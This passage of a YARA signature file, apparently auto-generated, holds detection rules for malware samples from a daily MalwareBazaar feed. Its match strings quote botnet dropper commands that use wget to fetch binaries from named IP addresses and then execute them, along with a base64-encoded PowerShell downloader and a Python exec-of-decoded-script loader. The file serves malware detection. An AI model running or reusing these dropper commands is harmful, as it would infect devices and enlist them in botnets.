      $s7 = "WgBpAHAAUABhAHQAaAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAkAFAAeQB0AGgAbwBuAFUAbgBwAGEAYwBrAFAAYQB0AGgAIAAtAEYAbwByAGMA" ascii /* base64 encoded string 'Z i p P a t h   - D e s t i n a t i o n P a t h   $ P y t h o n U n p a c k P a t h   - F o r c ' */
      $s8 = "eQB0AGgAbwBuAC8AMwAuADEAMAAuADQALwBwAHkAdABoAG8AbgAtADMALgAxADAALgA0AC0AZQBtAGIAZQBkAC0AYQBtAGQANgA0AC4AegBpAHAAIgA7ACAAJABUAGUA" ascii /* base64 encoded string 'y t h o n / 3 . 1 0 . 4 / p y t h o n - 3 . 1 0 . 4 - e m b e d - a m d 6 4 . z i p " ;   $ T e ' */
      $s9 = "bgBaAGkAcABQAGEAdABoAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFQAZQBtAHAARgBvAGwAZABlAHIAIAAiAHAAeQB0AGgAbwBuAC0AMwAuADEAMAAuADQALQBlAG0A" ascii /* base64 encoded string 'n Z i p P a t h = J o i n - P a t h   $ T e m p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m ' */
      $s10 = "bQBwAEYAbwBsAGQAZQByAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABQAGEAdABoACgAKQA7ACAAJABQAHkAdABoAG8A" ascii /* base64 encoded string 'm p F o l d e r = [ S y s t e m . I O . P a t h ] : : G e t T e m p P a t h ( ) ;   $ P y t h o ' */
      $s11 = "JABQAHkAdABoAG8AbgBEAG8AdwBuAGwAbwBhAGQAVQByAGwAPQAiAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAHAAeQB0AGgAbwBuAC4AbwByAGcALwBmAHQAcAAvAHAA" ascii /* base64 encoded string '$ P y t h o n D o w n l o a d U r l = " h t t p s : / / w w w . p y t h o n . o r g / f t p / p ' */
      $s12 = "cwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBIAFIAMABjAEgATQA2AEwAeQA5AHkAWQBYAGMA" ascii /* base64 encoded string 's t e m . C o n v e r t ] : : F r o m B a s e 6 4 S t r i n g ( ' a H R 0 c H M 6 L y 9 y Y X c ' */
      $s13 = "cABGAG8AbABkAGUAcgAgACIAcAB5AHQAaABvAG4ALQAzAC4AMQAwAC4ANAAtAGUAbQBiAGUAZAAiADsAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFUAcgBsAFMA" ascii /* base64 encoded string 'p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m b e d " ;   $ P y t h o n S c r i p t U r l S ' */
      $s14 = "YgBlAGQALQBhAG0AZAA2ADQALgB6AGkAcAAiADsAIAAkAFAAeQB0AGgAbwBuAFUAbgBwAGEAYwBrAFAAYQB0AGgAPQBKAG8AaQBuAC0AUABhAHQAaAAgACQAVABlAG0A" ascii /* base64 encoded string 'b e d - a m d 6 4 . z i p " ;   $ P y t h o n U n p a c k P a t h = J o i n - P a t h   $ T e m ' */
      $s15 = "bwB1AHIAYwBlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkA" ascii /* base64 encoded string 'o u r c e = [ S y s t e m . T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( [ S y ' */
      $s16 = "IABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABQAHkAdABoAG8AbgBEAG8AdwBuAGwAbwBhAGQAVQByAGwAIAAtAE8AdQB0AEYA" ascii /* base64 encoded string '  I n v o k e - W e b R e q u e s t   - U r i   $ P y t h o n D o w n l o a d U r l   - O u t F ' */
      $s17 = "YwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABDAG8AbgB0AGUAbgB0ADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUA" ascii /* base64 encoded string 'c t   - E x p a n d P r o p e r t y   C o n t e n t ;   I n v o k e - W e b R e q u e s t   - U ' */
      $s18 = "IAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJABQAHkAdABoAG8AbgBTAGMAcgBpAHAAdABQAGEAdABoACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcA" fullword ascii /* base64 encoded string '  - A r g u m e n t L i s t   $ P y t h o n S c r i p t P a t h   - N o N e w W i n d o w ' */
      $s19 = "cgBpACAAJABQAHkAdABoAG8AbgBTAGMAcgBpAHAAdABVAHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAUAB5AHQAaABvAG4AUwBjAHIAaQBwAHQAUABhAHQAaAA7ACAA" ascii /* base64 encoded string 'r i   $ P y t h o n S c r i p t U r l   - O u t F i l e   $ P y t h o n S c r i p t P a t h ;   ' */
      $s20 = "bwBuAFMAYwByAGkAcAB0AFUAcgBsAFMAbwB1AHIAYwBlACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUA" ascii /* base64 encoded string 'o n S c r i p t U r l S o u r c e   - U s e B a s i c P a r s i n g   |   S e l e c t - O b j e ' */
   condition:
      uint16(0) == 0x414a and filesize < 7KB and
      8 of them
}

rule sig_606be47bfe3ec379dc8a898f8fb6df5d1ef7c0fae70606de35e889b3808bc31e {
   meta:
      description = "evidences - file 606be47bfe3ec379dc8a898f8fb6df5d1ef7c0fae70606de35e889b3808bc31e.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "606be47bfe3ec379dc8a898f8fb6df5d1ef7c0fae70606de35e889b3808bc31e"
   strings:
      $s1 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/i686    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s2 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/arm6    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s3 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/arm5    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s4 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/mpsl    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s5 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/arm     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s6 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/mips    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s7 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/arc     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s8 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/arm7    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s9 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/ppc     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s10 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/sh4     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s11 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/spc     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s12 = "cp /bin/busybox busybox; rm -rf o; busybox wget http://103.163.215.73/m68k    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s13 = "rm -rf o; wget http://103.163.215.73/spc     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s14 = "rm -rf o; wget http://103.163.215.73/m68k    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s15 = "rm -rf o; wget http://103.163.215.73/ppc     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s16 = "rm -rf o; wget http://103.163.215.73/arm7    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s17 = "rm -rf o; wget http://103.163.215.73/mips    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s18 = "rm -rf o; wget http://103.163.215.73/arm6    -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s19 = "rm -rf o; wget http://103.163.215.73/arc     -O- > o; chmod 777 o; ./o tplink" fullword ascii
      $s20 = "rm -rf o; wget http://103.163.215.73/arm5    -O- > o; chmod 777 o; ./o tplink" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 6KB and
      8 of them
}

rule sig_67c5421e551a0aa0004703113350e2d51087ca9aab7ce5b93a239b1308ffc9af {
   meta:
      description = "evidences - file 67c5421e551a0aa0004703113350e2d51087ca9aab7ce5b93a239b1308ffc9af.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "67c5421e551a0aa0004703113350e2d51087ca9aab7ce5b93a239b1308ffc9af"
   strings:
      $s1 = "wget http://91.202.233.145/elitebotnet.arm; chmod 777 *; ./elitebotnet.arm elitebotnet.arm;" fullword ascii
      $s2 = "wget http://91.202.233.145/elitebotnet.mpsl; chmod 777 *; ./elitebotnet.mpsl elitebotnet.mpsl;" fullword ascii
      $s3 = "wget http://91.202.233.145/elitebotnet.m68k; chmod 777 *; ./elitebotnet.m68k elitebotnet.m68k;" fullword ascii
      $s4 = "wget http://91.202.233.145/elitebotnet.arm5; chmod 777 *; ./elitebotnet.arm5 elitebotnet.arm5;" fullword ascii
      $s5 = "wget http://91.202.233.145/elitebotnet.arm7; chmod 777 *; ./elitebotnet.arm7 elitebotnet.arm7;" fullword ascii
      $s6 = "wget http://91.202.233.145/elitebotnet.x86; chmod 777 *; ./elitebotnet.x86 elitebotnet.x86;" fullword ascii
      $s7 = "wget http://91.202.233.145/elitebotnet.mips; chmod 777 *; ./elitebotnet.mips elitebotnet.mips;" fullword ascii
      $s8 = "wget http://91.202.233.145/elitebotnet.arm6; chmod 777 *; ./elitebotnet.arm6 elitebotnet.arm6;" fullword ascii
      $s9 = "wget http://91.202.233.145/elitebotnet.sh4; chmod 777 *; ./elitebotnet.sh4 elitebotnet.sh4;" fullword ascii
      $s10 = "rm -rf elitebotnet.*" fullword ascii
   condition:
      uint16(0) == 0x6777 and filesize < 2KB and
      all of them
}

rule sig_756ada0e380d9e6cfa45d59d49ff71e2d857cfe9191012ab7920214d7a0c02ef {
   meta:
      description = "evidences - file 756ada0e380d9e6cfa45d59d49ff71e2d857cfe9191012ab7920214d7a0c02ef.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "756ada0e380d9e6cfa45d59d49ff71e2d857cfe9191012ab7920214d7a0c02ef"
   strings:
      $s1 = "exec(decoded_script)" fullword ascii
      $s2 = "decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()" fullword ascii
      $s3 = "encoded_script=\"eNqtWHtz2kgS/3v1KfpI5SQlsszLQLwhtRhkWxUMFMjxpRIvJcQAcxGSVhK2yT0++3XPSAgbx1u5WsoJUk/3r5/TM42qqkpnk67C+BR+C9xvyTY" ascii
      $s4 = "mnsIY1Wu0QcPkY2ftpF4gEC+m9IHTdf3JFLs2ZmgoDL/UMsumAeqMsaX1RlFnH+g+RcZhsLwb2yb+Yw0Np8SFffYl1sZB3wsi6cF9nham8624k4gXgor0RUO78FngVYg" ascii
      $s5 = "encoded_script=\"eNqtWHtz2kgS/3v1KfpI5SQlsszLQLwhtRhkWxUMFMjxpRIvJcQAcxGSVhK2yT0++3XPSAgbx1u5WsoJUk/3r5/TM42qqkpnk67C+BR+C9xvyTY" ascii
      $s6 = "nKKvJC8vK+YGm6f3TVPft/qqbIQZp+QSTzV6yvdHviyQGs8h9QkJSw0571c4oEAlyzby4oyQaiiv7/oppz6Kw9KSabVdyzwonbIB6A+0ikw9w1QxAGMB7/Cp9kOmqgEN" ascii
      $s7 = "t1Vs7vhXLe9TDwRyJvtTe6ZWqrX6SaPZKhSs0jRqq/R/ImDCOZtmaFOspbZ67IdLHhwfpiHaYtsO5PkkaUVKLNy3e4FR5mwBOep97EbY57S5m7oGFJbrpwrghy/2aNDG" ascii
      $s8 = "ZEDASv2HTDVMADIgYOVEf8Gmkwzp5CWbGhlS9SWbmpl3tZdsqmfe1YvweRS+LANZ/CsNSsAbbdexsbI4VSHljT+pw6c5wB2l79IgWjd44q2oCS1/fAuVZ4oae82OFw/O" ascii
      $s9 = "IrHrKDBzoJYcrtdE8HnAYMnvWCCwsaqGRzIuVNZYV50ru7cXIUySrPmxsjNUKmurlXd1s1Ku4r+6Wa0XjlDk22q9vucbRbmtppgyetpjxSbcVpdhuPQZdn1VYYE4JnCP" ascii
      $s10 = "5h+JLATbeyC/k/Iv/PYZXmIyKUPBXCuk9UecHN62obIjMT9hP6G2/P+rzbVmgSWWRCsAJLsI85Yzfz7NkzJFnik2SuauKUh4+7jDy0OYiLO5XRZBK5VKF1nrEEfnAx2t" ascii
      $s11 = "QkTcUAStu3K7hAcej/DKZaKMIjKApzX2Hh7QQewxLYema06apSR2ecLA2UbMiuMwlnI5I/wd/lt+WGSffYFPrr+REpo6yrmxzZHGDaLXqqaqP2uEcFSE6CULnghRYP5U" ascii
      $s12 = "zdOhWq7WFKXHEi/mUcrD4BRG29hd8zmsw/nGZ8AemLehFfBid46ENIR5eB/4oTs3YM68eBul4AbzjJMBD47WbB3GWxMUpRtG25gvV6lUNWLxmicJwfEEVixmsy0sYzdI" ascii
      $s13 = "ntWDUmeC7yUDbmzncnjtAHKMOwPnMwzPoTP4DB/tQc8A6x+jsTWZwHAM9tWob1tIswfd/nXPHlzAGcoNhg707SvbQVBnCKQwg7KtCYFdWePuJb52zuy+7Xw2lHPbGRDm" ascii
      $s14 = "u3vmk68lDiQpe6ChCcctczLpdyVBo1ccvp1hd9ifOv3JtIvD9MDRdyKmt8LZaLoKkzRw13SDOnfxhlWs43DBF1u6iLMMvmuNnSkOypaiZJMfLjweBc2x/Nb2b/4YZfX0" ascii
      $s15 = "qAB6IQFjEGJ+J6d3EYbR2cfeeVXMp3jBx+kWx+EEJ3zfjc0MhsQwMfT1RvTx4+NCH6VJ/3Jaq94emPJhz5TnHUnDEPwwWJIjypPrgovdbiYKkEKPNZghfedRlo+fuDvo" ascii
      $s16 = "OYJ2YNQZO3b3ut8Zw+h6PBpOLFTfQ9iBPTgfoxbryho4JmpFGlif8AUml51+X6jqXKP1Y2Ffdzj6PLYvLh24HPZ7FhLPLLSsc9a3pCp0qtvv2FeG0utcdS4sITVElLFg" ascii
      $s17 = "+Fh9C49nF0FXoSCLYfEtHA4ISPz66JImP3LgNGeNenZB1p5e/7XH84Re3KT3ZwJdN3F3EV3dpIujlorLX5Vf8AOwYi4WXdL+l3qNVh91aEZVT6EYWP+jK9IO+m0Iy699" ascii
      $s18 = "k9bBzaUlSKivg39dxx4OyI3ucOCM8dVAL8fOTvTGnlgGdMb2hAJyPh5eGUDhRImhAEG5gSVRKNSwnxEFWej9Gp3e2dKzOn3EmpDwPrOpqNiEFL6mbAMW/sZL87dN7Pt8" ascii
      $s19 = "Jq81+FsbatXnrS04+Z1gbP2AD6mUsDjEux/TUL2Xq5ZJ1rQ7eP8eqRijIkQ6/Bvu4MMH0GpVOMLVHOePDXZ3PLLicEOlhNc7dAhB8Y6Y77Yv7i1Wkia+3+Lr7PYxdsY1" ascii
      $s20 = "9GHIhMZ/Mi8lCrEvQt8P78k1LwzmnDxKThUHV9xZeMeEKzKTQZiipdICin9UJDVbSlYumj5jWbxQLUbX3fMmJu1JinnnGPoojIW6p16ainNpwWR47tx0xhbYExiNh5/s" ascii
   condition:
      uint16(0) == 0x6d69 and filesize < 9KB and
      8 of them
}

rule sig_85cb0783917ec11f599e250514209083944cf619f8bbf7ca475f4f6f7d26afe0 {
   meta:
      description = "evidences - file 85cb0783917ec11f599e250514209083944cf619f8bbf7ca475f4f6f7d26afe0.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "85cb0783917ec11f599e250514209083944cf619f8bbf7ca475f4f6f7d26afe0"
   strings:
      $s1 = "exec(decoded_script)" fullword ascii
      $s2 = "encoded_script=\"eNqtWHtz2kgS/3v1KfpI5SQlsswb4g2pxSDbqmBwgRxfKvFSQgwwFyFpJWGb3OOzX/eMhLBxvJWrpVxG6un+9XN6plFVVelu0lUYn8Bvgfst2Qa" ascii
      $s3 = "decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()" fullword ascii
      $s4 = "1/GvWt6nPmLOGexPnZmkNVvtAniVplFHpf+JgAjnbJohTbGEOuqxHy55cHwY/WiL3TqQx5KkFZmwcLvuxUOZswXkqPexG2F70+Zu6hpQWK2fKIAfvtijQQdL7SGMVblG" ascii
      $s5 = "encoded_script=\"eNqtWHtz2kgS/3v1KfpI5SQlsswb4g2pxSDbqmBwgRxfKvFSQgwwFyFpJWGb3OOzX/eMhLBxvJWrpVxG6un+9XN6plFVVelu0lUYn8Bvgfst2Qa" ascii
      $s6 = "zO/k0C7CcHX6sX9WFWMp3utxqMUpOMHB3ndjM4MhMUwMfb0Rffz4uNBHadK/nNSqtwemfNgz5XlH0jAEPwyW5Ijy5LrgYrebiQKk0GMNZkjfeZTl4yfuDvrunvnka4lz" ascii
      $s7 = "vtWHUneC7yUDbmznYnTtAHKMu0PnM4zOoDv8DB/tYd8A6x9XY2sygdEY7MurgW0hzR72Btd9e3gOpyg3HDkwsC9tB0GdEZDCDMq2JgR2aY17F/jaPbUHtvPZUM5sZ0iY" ascii
      $s8 = "E4ldR4GZA7XkcL0mgs8DBkt+xwKBjVU1OpJxobLGuupe2v29CGGSZM2PlZ2hUllHfVczK9WWWWk1zHaj8IMC31Hr9T3XKMgdNcWM0dMeK/bgjlqp1uoozwJxQuD27qjY" ascii
      $s9 = "SMoeaFbCKcucTAY9SdDoFWduZ9QbDabOYDLt4Qw9dPSdiOmtcCSarsIkDdw13aDOXLxhFes4U/DFli7iLIPvWWNnivOxpSjZwIcLjydAcyy/tf2bP0ZZPTk+Vt/C45FF" ascii
      $s10 = "NUwAMiBgpaG/YFMjQ2q8ZFMzQ6q+ZFMr8672kk31zLt6ET6PwpdlIIt/pUkJeKPtOjZWFqcqpLzxJ3X4NAe4o/RdGkTrBk+8FTWh5Y9vofJMUWOv2fHiwZljFZWk5Y+H" ascii
      $s11 = "hagBlaaesXgZkCeB5s8DzR4BzSSQR0BV/a+xqP0XGdQSYfTSB+pD5Vt4g75KwpeTuoCuNGv1VrPcLjdQa6NFj622gZNIrVlvtfB4Qa9a71rVdqNaE2Ei2TqcoK8kL+8o" ascii
      $s12 = "Zwjahavu2LF714PuGK6ux1ejiYXq+wg7tIdnY9RiXVpDx0StSAPrE77A5KI7GAhV3Wu0fizs642uPo/t8wsHLkaDvoXEUwst654OLKkKneoNuvalofS7l91zS0iNEGUs" ascii
      $s13 = "0FUoyGJGfAuHAwISvz66pMmPnDPNWbOeXZC1p9d/7fE8oRc36f2ZQNdN3F1EVzfp4qit4vJX5Rf8AKyYi0WXdP6lXqPVR10aTdUTKObU/+iKtIN+EsLy6xyaJUtCfZ2c" ascii
      $s14 = "n5kx+2ODuy2nztyENes7icTPH1duskJ+RXn16hWcW0Nr3B2QoWf2OSDplaLg5oun7hI3P3RAvQy/c993jxtmGbQbHmD/SgDzUCmb5V8BCc36r/DQrOvQjSKf3bDZR54e" ascii
      $s15 = "DNEWMWMQLsBbufGSGaTKDbYQsThBgXCWujzgwRJc8BCWONMVwiThIr13YyascJMk9LiLeGimt1mzIHWF+QvuswS0dMWgNMkkSrqhkD/M9dFsoLV8Ce45hmuTQsySNOYe" ascii
      $s16 = "vE5UeA3a/iBmwP74pRuqm3icq5jyPKbuHOMozNBK8rdA/l3sgZIBpVM34R68TkqIu2/HU490ShpNCIc5w9cQr8Ra9k4/fokS6OS1oCuRu6XfDTsSAiXduSaoqKXzNOgZ" ascii
      $s17 = "Hzw7Nn7aQeIBAvltSh80Xd+TSLFVZ4KCyvxDLbtAHqjKGF9WZxRx/oHmX2QYCsO/sW3mM9LYfEpU3FpfbmUc8LEsnhbY2mltOtuKq4B4KaxEVzi8B58FWoGYfySyEOzs" ascii
      $s18 = "+jBkQuM/mZcShdgXoe+H9+SaFwZzTh4lJ4qDK+4svGPCFZnJIEzRUmkBxT8qkpotJSsXTZ+xLF6oFqPr7nkTk/YkxbxzDH0UxkLdUy9NxbmwYDI6c266YwvsCVyNR5/s" ascii
      $s19 = "8o/uJ8XhTOXUGYYBe+6osCQ3aHQ4y4ld//lzQur6037L76jjkynZHekOHZqpX8sq7tB2xvNC488UIz2Py+HZ8pFtSQlbR+lWniiPW/37XacHwKv2qD/SohQVQD8kYAxC" ascii
      $s20 = "yu0RHng8wpuWiTKKyAAe0thyeEDnr8e0HJpuN2mWktjlCQNnGzErjsNYyuWM8Hf4b/lhkX32BT65/kZKaOpVzo3djTRuEL1WNVX9WSOEoyJEL1nwRIgC86cyea3B3zpQ" ascii
   condition:
      uint16(0) == 0x6d69 and filesize < 9KB and
      8 of them
}

rule c0c5e6f12fc52f9bc4ad5793734262e8d1dcd0d94183c31df25aa3c58c780223 {
   meta:
      description = "evidences - file c0c5e6f12fc52f9bc4ad5793734262e8d1dcd0d94183c31df25aa3c58c780223.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "c0c5e6f12fc52f9bc4ad5793734262e8d1dcd0d94183c31df25aa3c58c780223"
   strings:
      $s1 = "exec(decoded_script)" fullword ascii
      $s2 = "encoded_script=\"eNqtWHtz2kgS/3v1KfpI5SQlsswbxxtSi0G2VcFAgRxfKvFSQgwwFyFpJWGb3OOzX/eMhLBxvJWrVTmRpqf716+ZnmlUVVU6m3QVxqfwW+B+S7Y" ascii
      $s3 = "decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()" fullword ascii
      $s4 = "zJj9scHdllNnbsKa9Z1E4uefKzdZIb+ivHr1Ci6sgTXu9MnQc/sCkPRKUXDzxVN3iZsf2qBehd+577vHDbMM2g0PsH4lgHmolM3yr4CEZv1XeGjWdehEkc9u2OwjT48b" ascii
      $s5 = "Qxirco4ePEE2ftpG4gEC+W5KHzRd35NIsWBngoLK/EMtu2AeqMoYX1ZnFHH+geZfZBgKw7+xbeYz0th8SlTcYF9uZRzwsyy+FljgaW4624oLgRgUVqIrHN6DzwKtQMwf" ascii
      $s6 = "encoded_script=\"eNqtWHtz2kgS/3v1KfpI5SQlsswbxxtSi0G2VcFAgRxfKvFSQgwwFyFpJWGb3OOzX/eMhLBxvJWrVTmRpqf716+ZnmlUVVU6m3QVxqfwW+B+S7Y" ascii
      $s7 = "Sevg5tISJNTXwb+uYw8H5EZ3OHDGODTQy7GzE72xJ5YBnbE9oYCcj4dXBlA4UWIoQFBuYEkUCjXsZ0RBFhpfo9M7W3pWp49YExLeZzYVFYuQwteUbcCFv/HSfLSJfZ/P" ascii
      $s8 = "tZZZa4L28dK56hu40b8xuGDet1CH7ioO1+y4cWKWzVq5+s6sVMowcRduzKWYqkSyjE5lGW2r+D6arcxoq0qzHdo5uNMWfEkbFE1lsahaWBDzEoxO3LEYNhHuLNwscbqJ" ascii
      $s9 = "NfhbG2rV560tOPmdYDz5AR9SKWFxiBc/pqF6L1ctk6xpd/D+PVIxRkWIdPg33MGHD6DVqnCEsznOHxss7XhexeGGlhLe7dAhBMULYr7bvri3uJI08X6Lw9ntY+yMa05c" ascii
      $s10 = "sbLjX7W8Tz0QyJnsT+2ZWqnW6o1m66RQsErTqK3S/4mACedsmqFNcSG11WM/XPLg+DAH0RZrdiAPJ0kr8mHhpt2LijJnC8hR72M3wiKnzd3UNaCwXD9VAB++2KNBGxfc" ascii
      $s11 = "e1YPSp0JjksG3NjO5fDaAeQYdwbOZxieQ2fwGT7ag54B1j9GY2sygeEY7KtR37aQZg+6/euePbiAM5QbDB3o21e2g6DOEEhhBmVbEwK7ssbdSxx2zuy+7Xw2lHPbGRDm" ascii
      $s12 = "aJ4O1XK1pig9lngxj1IeBqcw2sbums9hHc43PgP2wLwNzYAXu3MkpCHMw/vAD925AXPmxdsoBTeYZ5wMeHC0Zusw3pqgKN0w2sZ8uUqlqhGL1zxJCI4nsGIxm21hGbtB" ascii
      $s13 = "04chExr/ybyUKMS+CH0/vCfXvDCYc/IoOVUcnHFn4R0TrshMBmGKlkoLKP5RkdRsKlm5aPqMZfFCtRhdd8+bmLQnKeadY+ijMBbqnnppKs6lBZPhuXPTGVtgT2A0Hn6y" ascii
      $s14 = "XE8Erbtyu4QHHo/wvmWijCIygEc1Fh4e0CnsMS2HpjtOmqUkdnnCwNlGzIrjMJZyOSP8Hf5bflhkz77AJ9ffSAlNHeXcWONI4wbRa1VT1Z81QjgqQvSSBU+EKDB/KpOv" ascii
      $s15 = "iSwE23sgv5PyL/z2GV5iMilDwVwrpPVHnBzetqGyIzE/YT+htvz/q821ZoEllkQrACS7CPOWM38+zZMyRZ4pVknmrilIePW4w5tDmIiDuV0WQSuVShdZ3RDn5gOdq0JE" ascii
      $s16 = "yhBtETMG4QK8lRsvmUGq3GALEYsTFAhnqcsDHizBBQ9hiTNdIUwSLtJ7N2bCCjdJQo+7iIdmeps1C1JXmL/gPktAS1cMSpNMoqQbCvnDXB/NBprLp+CeY7g2KcQsSWPu" ascii
      $s17 = "llwS6uvk9HWiwmvQ9rsxA/bbMN1Q3cTjXMWU5zF15xhHYYZWkr8I8u9iD5QMKJ25CffgdVJC3H07nnqkU9KoQzjMGQ5DvBJr2Zh+AhNLoJ2vBV2J3C39etiWECjpzjVB" ascii
      $s18 = "X0le3lTMDRZP75umvj/pq7IQZpySS3zV6CvfH/m0QGo+h9QnJFxqyHm/wu4EKlm2kRcbhFRDeX1XTznVUeyUlkyr7UrmwdIpG4D+wEmRqWeYKgZgLOAdftV+yFQ1oIkM" ascii
      $s19 = "EYaBTJ6/mZMN+bTP1zzTQOLC14Qs3yToAdlpUCj5gt5MuBVtZj5PVhg9TtAzDJoBCRE9FqCUgn4chzEkzPcJgaPdwtfCOkP4iloiCmiahUjovV+F68eeYIgWmzhAlWwu" ascii
      $s20 = "mVli9LsQNaDS1DMWLwPyJND8eaDZI6CZBPIIqKr/NRad/EUGtUQYvfSB6lD5Ft6gr5Lw5bQuoCvNWr3VLJ+UG6i10aLP1omB/UitWW+18HhBr1rvWtWTRrUmwkSydThF" ascii
   condition:
      uint16(0) == 0x6d69 and filesize < 9KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340_4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa45229_0 {
   meta:
      description = "evidences - from files 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
      hash2 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s3 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s4 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s5 = "  passwordToggleContentDescription" fullword ascii
      $s6 = "##password_toggle_content_description" fullword ascii
      $s7 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s8 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s9 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s10 = "res/drawable/design_password_eye.xml" fullword ascii
      $s11 = "$$res/drawable/design_password_eye.xml" fullword ascii
      $s12 = "44Widget.MaterialComponents.CompoundButton.RadioButton" fullword ascii
      $s13 = "%%res/layout/test_toolbar_elevation.xml" fullword ascii
      $s14 = "44Widget.MaterialComponents.NavigationRailView.Compact" fullword ascii
      $s15 = "GGThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Spinner" fullword ascii
      $s16 = "11Widget.MaterialComponents.CompoundButton.CheckBox" fullword ascii
      $s17 = "AABase.ThemeOverlay.MaterialComponents.Light.Dialog.Alert.Framework" fullword ascii
      $s18 = "error_icon_content_description" fullword ascii
      $s19 = "errorContentDescription" fullword ascii
      $s20 = "**mtrl_exposed_dropdown_menu_popup_elevation" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e884859_1 {
   meta:
